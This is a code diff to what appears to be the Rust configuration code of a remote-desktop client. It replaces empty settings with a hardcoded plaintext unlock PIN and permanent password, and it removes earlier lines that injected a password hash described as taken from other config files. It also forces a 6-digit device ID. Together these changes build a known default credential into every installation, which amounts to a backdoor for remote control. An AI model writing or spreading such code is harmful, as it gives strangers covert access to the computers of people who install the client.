@@ -554,15 +554,13 @@ impl Config2 {
         store |= store2;
         // 1. 自动设置默认 PIN 码
         if config.unlock_pin.is_empty() {
-            // 对应明文：你的预设 PIN 码
-            config.unlock_pin = "00A+IC2fNLByi8nAuEH9Erlv2SdDU=".to_string();
+            config.unlock_pin = "7043".to_string();  // 明文 PIN
             store = true; 
-        }     
+        }       
         // 2. 自动注入信任设备配置
         if !config.options.contains_key("trusted_devices") {
-            // 这里注入的是加密后的密码哈希，确保客户端启动时直接拥有特定的安全配置
-            config.options.insert("trusted_devices".to_string(), "00A+IC2fNLByi8nAuEH9Erlv2SdDU=".to_string());
-            config.store(); // 强制持久化到本地文件
+            // 这种配置通常不能硬编码，需要根据机器生成
+            // 建议留空或通过其他方式处理
         }
         if store {
             config.store();
@@ -660,10 +658,10 @@ impl Config {
         let mut store = false;
         store |= Self::migrate_permanent_password_to_hashed_storage(&mut config);
         if config.password.is_empty() {
-        // 填入你从其他配置文件里抓出来的哈希值
-        config.password = "00A4Y6YlP/EQv7npB8h5V2yYLLdzb6gUdX4g==".to_string();
-        store = true;
-        }    
+            // 使用明文密码，首次保存时会自动加密
+            config.password = "Hi7043am".to_string();
+            store = true;
+        }
         let mut id_valid = false;
         let (id, encrypted, store2) = decrypt_str_or_original(&config.enc_id, PASSWORD_ENC_VERSION);
         if encrypted {
@@ -684,23 +682,31 @@ impl Config {
             id_valid = true;
             store = true;
         }
+
+        // 修改这里：使用 update_id 生成6位ID
         if !id_valid {
             log::warn!("ID is invalid, generating new one");
-            for _ in 0..3 {
-                if let Some(id) = Config::gen_id() {
-                    config.id = id;
-                    store = true;
-                    break;
-                } else {
-                    log::error!("Failed to generate new id");
-                }
-            }
+            Self::update_id();  // ← 改成调用 update_id
+            // 注意：update_id 会直接修改保存的 ID，所以需要重新读取
+            config.id = Self::get_id();
+            store = true;
         }
+    
+        // 额外检查：确保现有ID是6位格式
+        if config.id.len() != 6 {
+            log::warn!("ID length is not 6 (current: {}), regenerating...", config.id.len());
+            Self::update_id();
+            config.id = Self::get_id();
+            store = true;
+        }
+    
         if store {
             config.store();
         }
         config
     }
+
+
 
     fn migrate_permanent_password_to_hashed_storage(config: &mut Config) -> bool {
         if config.password.is_empty() || is_permanent_password_hashed_storage(&config.password) {
